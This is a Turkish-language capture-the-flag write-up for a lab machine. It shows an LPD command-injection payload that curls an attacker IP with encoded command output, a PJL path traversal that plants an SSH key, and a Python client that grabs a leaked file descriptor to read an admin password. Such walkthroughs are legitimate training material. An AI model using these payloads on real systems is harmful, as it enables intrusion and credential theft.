@@ -1,0 +1,190 @@
+İlk olarak nmap ile açık portları taradım:
+
+```
+nmap -sC -sV -T4 -p- ip
+```
+
+```
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 10.0p2 Ubuntu
+80/tcp   open  http     nginx 1.28.0
+1515/tcp open  unknown  (LPD server)
+```
+
+Port 80'de "Intranet | Document Archiving Service" başlıklı bir sayfa karşıladı beni. Sayfada birkaç kritik bilgi vardı:
+
+- **Protocol:** `Compliance Level: RFC 1179` — bu doğrudan Line Printer Daemon (LPD) protokolüne işaret ediyor
+- **Target Queue:** `archive_intake`
+- **Binary indirme linki:** `/download/archive` — `paperwork-archive-v1.02`
+
+---
+
+## İlk Adım — Binary Analizi
+
+Binary'yi indirip inceledim:
+
+```bash
+curl http://paperwork.htb/download/archive -o archive
+file archive   # Zip archive
+unzip archive  # server.py çıktı
+```
+
+`server.py` içinde bir LPD sunucu implementasyonu vardı ve **kritik bir güvenlik açığı** göze çarpıyordu:
+
+```python
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+```
+
+`job_name` doğrudan `shell=True` ile çalıştırılan komuta ekleniyor — klasik **komut enjeksiyonu**. Server port **1515**'te dinliyor.
+
+---
+
+## Foothold — LPD Command Injection (lp user)
+
+LPD protokolü (RFC 1179) akışı:
+1. `\x02<queue>\n` ile iş kabul komutu gönder
+2. `\x02<size> <filename>\n` ile kontrol dosyası başlığı gönder
+3. `J<job_name>` içeren kontrol dosyasını gönder
+
+Single-quote breakout ile enjeksiyon:
+
+```
+job_name = "x'; curl -s http://10.10.16.75:8080/$(id | base64 -w0); echo '"
+```
+
+Tam shell komutu:
+```bash
+echo 'Archive: x'; curl -s http://10.10.16.75:8080/$(id | base64 -w0); echo '' >> /tmp/archive.log
+```
+
+Callback'ten `uid=7(lp)` döndü — sunucu `lp` kullanıcısı olarak çalışıyor.
+
+Daha fazla enumeration için HTTP callback sistemi kurdum: hex-encoded Python scriptlerini LPD injection yoluyla `/tmp` dizinine yazıp çalıştırdım.
+
+---
+
+## Enumeration — İç Servislerin Keşfi
+
+`/etc/passwd` çekerek sistemi inceledim:
+- **archivist** (uid=1000) — hedef kullanıcı
+
+`ps aux` çıktısından dikkat çeken prosesler:
+
+```
+archivist   985  python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ ...
+root        970  python3 /root/staging/CorpoSite/app.py
+root       1425  python3 /usr/bin/paperwork-daemon
+```
+
+`ss -tlnp` çıktısı:
+```
+127.0.0.1:9100   # JetDirect (archivist)
+127.0.0.1:1337   # Staging app (root)
+0.0.0.0:1515     # LPD server (lp)
+```
+
+### paperwork-daemon Analizi
+
+Root'un çalıştırdığı `/usr/bin/paperwork-daemon` kaynak kodunu okudum. En kritik kısım:
+
+```python
+admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
+
+def scan_for_malice():
+    with open(LOG_PATH, 'r') as f:
+        content = f.read().upper()
+        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
+            return True
+    return False
+
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
+    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+```
+
+Daemon, `/run/paperwork/mgmt.sock` adlı Unix socket'te dinliyor. Eğer log dosyasında `FSQUERY/FSUPLOAD/FSDOWNLOAD` varsa, bağlanan istemciye **SCM_RIGHTS** üzerinden iki dosya descriptor'ı iletiyor: log dosyasının FD'si ve `admin_pins.conf`'un FD'si.
+
+Sorun: Daemon başlangıçta `admin_fd`'yi açıyor ve hiç kapatmıyor. Bu bir **FD sızıntısı**.
+
+---
+
+## lp → archivist — JetDirect PJL FSDOWNLOAD
+
+LPD injection yoluyla port 9100'deki JetDirect servisini probe ettim. PJL (Printer Job Language) komutları:
+
+```python
+@PJL FSDIRLIST NAME="0:/.." ENTRY=1 COUNT=99
+```
+
+Çıktı:
+```
+user.txt TYPE=FILE SIZE=33
+.ssh TYPE=DIR SIZE=4096
+printer TYPE=DIR SIZE=4096
+```
+
+`jetdirect.py`'nin `_translate` metodu:
+```python
+def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))
+```
+
+`os.path.normpath` `..` traversal'ı çözüyor ve root dışına çıkabiliyoruz. `FSDOWNLOAD` komutunu (`0:/../.ssh/authorized_keys` path'i ile) kullanarak SSH public key yazdım:
+
+```python
+pjl_cmd = b'@PJL FSDOWNLOAD DISKFILE NAME="0:/../.ssh/authorized_keys" SIZE=93\r\n'
+pjl_cmd += pubkey
+```
+
+Yanıt: `OK` — SSH anahtarı başarıyla yazıldı.
+
+```bash
+ssh -i htb_key archivist@ip
+```
+---
+
+## archivist → root — SCM_RIGHTS FD Sızıntısı
+
+JetDirect'e gönderilen FSDOWNLOAD ve FSUPLOAD komutları `commands.log`'a yazılmıştı. `paperwork-daemon`'ın `scan_for_malice()` fonksiyonu bu logu okuyunca `trigger_lockdown` çağırır.
+
+Daemon'ın Unix socket'ine archivist olarak bağlandım:
+
+```python
+import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+
+fds_buf = array.array("i")
+cmsg_space = socket.CMSG_SPACE(8 * fds_buf.itemsize)
+msg, ancdata, flags, addr = s.recvmsg(4096, cmsg_space)
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds = array.array("i")
+        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
+        for fd in fds:
+            os.lseek(fd, 0, os.SEEK_SET)
+            print(os.read(fd, 4096).decode())
+```
+
+FD 5 içeriği:
+```
+ADMIN_PASSWORD=*
+```
+
+Bu şifreyi `su root` ile denedim:
+
+```bash
+echo "*" | su -c "cat /root/root.txt" root
+```
